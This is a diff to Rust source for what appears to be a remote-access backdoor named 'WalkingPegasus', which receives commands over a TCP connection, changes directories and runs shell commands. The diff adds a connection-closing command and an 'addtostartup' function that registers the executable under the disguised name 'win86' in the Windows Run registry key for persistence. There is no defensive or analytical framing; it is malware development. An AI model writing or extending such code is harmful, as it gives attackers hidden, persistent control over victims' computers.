@@ -1,7 +1,9 @@
 #![allow(unused_imports, unused_variables, unused_mut)]
 
 use std::env;
-use std::net::TcpStream;
+use winreg::enums::{HKEY_CURRENT_USER, KEY_WRITE};
+use winreg::RegKey;
+use std::net::{Shutdown, TcpStream};
 use std::io::{self, Read, Write};
 use std::process::Command;
 
@@ -11,22 +13,21 @@ pub struct WalkingPegasus {
 }
 
 impl WalkingPegasus {
-    //      +=======+ FUNCTIONS +=======+      // 
+    //      +=======+ FUNCTIONS +=======+      //
     fn do_something(&self, command: String, s: &mut TcpStream) {
-        if command == "hello\n"
+        if command == "close_conn\n"
         {
-            s.write_all(b"Hello\n").expect("");
-    
+            s.write_all(b"Byyeee Bitch !!\n").expect("");
+            s.shutdown(Shutdown::Both).expect("");
         }
         else if command.starts_with("cd ") 
         {
             let path = command.trim_start_matches("cd ").trim().to_owned();
     
             if let Err(_) = env::set_current_dir(&path) {
-                s.write(b"Cant chnage it bro\n").expect("");
+                s.write(b"Given Directory either dosen't exist or there is other problem ;-;' \n").expect("");
             } 
             else { }
-            
         }
         else 
         {
@@ -66,5 +67,23 @@ impl WalkingPegasus {
                 Err(_) => { }
             }
         }
+    }
+
+    pub fn addtostartup(&self) -> Result<(), std::io::Error> {
+        let current_exe = env::current_exe()?;
+        let (key_path, value_name) = if cfg!(target_os = "windows")
+        {
+            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "win86")
+        }
+        else 
+        {
+            return Err(std::io::Error::new(std::io::ErrorKind::Other, ""));
+        };
+    
+        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
+        let (key, _) = hkcu.create_subkey_with_flags(key_path, KEY_WRITE)?;
+        key.set_value(value_name, &current_exe.to_string_lossy().to_string())?;
+
+        Ok(())
     }
 }
